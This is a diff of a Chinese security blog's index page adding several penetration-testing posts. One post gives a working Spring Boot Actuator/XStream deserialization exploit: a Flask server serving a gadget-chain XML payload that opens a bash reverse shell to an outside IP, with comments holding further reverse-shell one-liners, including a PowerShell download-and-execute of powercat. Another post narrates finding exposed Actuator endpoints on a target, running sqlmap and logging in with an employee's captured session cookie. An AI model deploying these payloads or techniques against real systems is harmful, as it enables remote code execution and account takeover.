@@ -216,6 +216,153 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.wafer.org.cn/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="waf's blog">
+      <meta itemprop="description" content="一位行走在捡垃圾的行业专业人士。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wafのblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">Bypass 网防G01 注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-11 19:22:17" itemprop="dateCreated datePublished" datetime="2020-07-11T19:22:17+08:00">2020-07-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WAF/" itemprop="url" rel="index"><span itemprop="name">WAF</span></a>
+                </span>
+            </span>
+
+          
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/1.png" alt="1.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/07/11/Bypass%E7%BD%91%E9%98%B2G01%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.wafer.org.cn/2020/06/30/Spring_Boot_Actuator(XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="waf's blog">
+      <meta itemprop="description" content="一位行走在捡垃圾的行业专业人士。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wafのblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/30/Spring_Boot_Actuator(XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE)/" class="post-title-link" itemprop="url">Spring Boot Actuator(XStream反序列化RCE)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-30 14:57:27" itemprop="dateCreated datePublished" datetime="2020-06-30T14:57:27+08:00">2020-06-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
+                </span>
+            </span>
+
+          
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+<p>利用条件<br>可以 POST 请求目标网站的 /env 接口设置属性<br>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）<br>目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）<br>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+<p>eureka.client.serviceUrl.defaultZone</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># linux反弹shell bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/192.168.20.82/9999 0&gt;<span class="symbol">&amp;amp;</span>1</span></span><br><span class="line"><span class="xml"># windows反弹shell</span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>powershell<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"># <span class="tag">&lt;<span class="name">string</span>&gt;</span>powercat -c 192.168.123.1 -p 2333 -e cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">from flask import Flask, Response</span></span><br><span class="line"></span><br><span class="line"><span class="xml">app = Flask(__name__)</span></span><br><span class="line"></span><br><span class="line"><span class="xml">@app.route('/', defaults=</span><span class="template-variable">&#123;'path': ''&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">@app.route('/<span class="tag">&lt;<span class="name">path:path</span>&gt;</span>', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="xml">def catch_all(path):</span></span><br><span class="line"><span class="xml">    xml = """<span class="tag">&lt;<span class="name">linked-hash-set</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/88.88.88.88/3333 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">linked-hash-set</span>&gt;</span>"""</span></span><br><span class="line"><span class="xml">    return Response(xml, mimetype='application/xml')</span></span><br><span class="line"><span class="xml">if __name__ == "__main__":</span></span><br><span class="line"><span class="xml">    app.run(host='0.0.0.0', port=2222)</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.wafer.org.cn/2020/06/16/%E6%9F%90%E9%93%B6%E8%A1%8Chw%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -487,15 +634,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/06/15/bypass360%20SQL%E6%B3%A8%E5%85%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <p>由于本人比较懒就附上链接.<br><a href="https://www.t00ls.net/thread-55980-1-1.html" target="_blank" rel="noopener">Tools</a></p>
+
       
     </div>
 
@@ -563,15 +703,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/06/15/%E5%AE%9E%E6%88%98bypass%E5%AE%9D%E5%A1%94%E6%B3%A8%E5%85%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <p>由于首发圈子就附上链接<br><a href="https://www.secquan.org/Discuss/1071118" target="_blank" rel="noopener">实战bypass宝塔注入</a></p>
+
       
     </div>
 
@@ -639,15 +772,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <a id="more"></a>
+<p>是不是看到这种统一身份认证中心是不是感觉无从下手.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/2.png" alt="2.png"></p>
+<p>这里接口从js里面找到,其实我后面扫了下目录发现也可以找到.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/1.png" alt="1.png"></p>
+<p>由于这里漏洞被修复就没办法截图了,漏洞报告里面看不清楚,就只能描述下,这里毫无防护直接丢进sqlmap跑<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/3.png" alt="3.png"><br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/4.png" alt="4.png"></p>
+<p>由于我询问了下审核人员这里能否深入,他说到表就行了,只能放弃从注入登录后台<br>在这个测出注入前我发现这个站是spring boot框架,测试发现存在Spring Boot Actuator未授权访问<br>这里简单讲下Springboot的actuator配置</p>
+<p>/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过<br>/configprops    描述配置属性（包含默认值）如何注入 Bean<br>/beans    描述应用程序上下文里全部的 Bean，以及它们的关系<br>/dump    获取线程活动的快照<br>/env    获取全部环境属性<br>/env/{name}    根据名称获取特定的环境属性值<br>/health    报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供<br>/info    获取应用程序的定制信息，这些信息由 info 打头的属性提供<br>/mappings    描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系<br>/metrics    报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数<br>/metrics/{name}    报告指定名称的应用程序度量值<br>post    /shutdown    关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）<br>/trace    提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）<br>/auditevents    显示应用暴露的审计事件 (比如认证进入、订单失败)<br>/loggers    显示和修改配置的loggers<br>/flyway    显示数据库迁移路径的详细信息<br>/liquidbase    显示Liquibase 数据库迁移的纤细信息<br>/scheduledtasks    显示应用中的调度任务<br>/threaddump    执行一个线程dump<br>/heapdump    返回一个GZip压缩的JVM堆dump<br>/logfile    返回log file中的内容(如果logging.file或者logging.path被设置)</p>
+<p><a href="http://xxxx/esc-sso/actuator/trace" target="_blank" rel="noopener">http://xxxx/esc-sso/actuator/trace</a> 运气也好蹲着一个员工未失效的cookie直接替换登录<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/5.png" alt="5.png"><br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/6.png" alt="6.png"><br>这里还存在获取被星号脱敏的密码的明文由于没有截图就不讲了放下连接<br><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener">github</a></p>
+
       
     </div>
 
@@ -814,158 +946,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.wafer.org.cn/2020/05/07/%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="waf's blog">
-      <meta itemprop="description" content="一位行走在捡垃圾的行业专业人士。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wafのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/05/07/%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">一个授权网站如何渗透</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-05-07 11:36:07" itemprop="dateCreated datePublished" datetime="2020-05-07T11:36:07+08:00">2020-05-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>最近面试的时候经常被问着如果拿着一个授权网站你渗透的思路是什么,我一般都是按着我平常的思路进行讲解,感觉很含糊今天这里就打算来总结下.</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/05/07/%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.wafer.org.cn/2020/05/07/thinkphp3.23%E7%BC%93%E5%AD%98getshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="waf's blog">
-      <meta itemprop="description" content="一位行走在捡垃圾的行业专业人士。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wafのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/05/07/thinkphp3.23%E7%BC%93%E5%AD%98getshell/" class="post-title-link" itemprop="url">thinkphp3.23缓存getshell</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-05-07 11:23:10" itemprop="dateCreated datePublished" datetime="2020-05-07T11:23:10+08:00">2020-05-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
-                </span>
-            </span>
-
-          
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/05/07/thinkphp3.23%E7%BC%93%E5%AD%98getshell/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1038,7 +1018,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
